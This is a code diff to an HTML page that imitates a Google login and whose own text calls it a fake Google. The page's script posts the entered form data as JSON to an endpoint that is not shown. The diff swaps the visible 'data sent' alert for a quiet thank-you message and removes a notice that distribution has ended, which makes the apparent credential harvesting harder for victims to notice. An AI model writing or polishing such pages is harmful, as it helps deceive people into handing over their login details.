@@ -30,6 +30,9 @@
                     <span>この偽のGoogleに新規登録しますか？ </span><a href="https://accounts.google.com/signup" target="_blank">アカウントを作成</a>
                 </div>
             </form>
+            <div id="thank-you-message" style="display: none; margin-top: 20px;">
+                ありがとうございます
+            </div>
         </div>
     </div>
     <script>
@@ -52,11 +55,16 @@
                 },
                 body: JSON.stringify(message)
             })
-            .then(response => response.ok ? alert('データが送信されました') : alert('送信に失敗しました'))
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('login-form').style.display = 'none';
+                    document.getElementById('thank-you-message').style.display = 'block';
+                } else {
+                    alert('送信に失敗しました');
+                }
+            })
             .catch(error => alert('エラーが発生しました: ' + error));
         });
     </script>
-    <h1>配布期間が終了しました。</h2>
-<h2>次回をお楽しみに</h2>
 </body>
 </html>
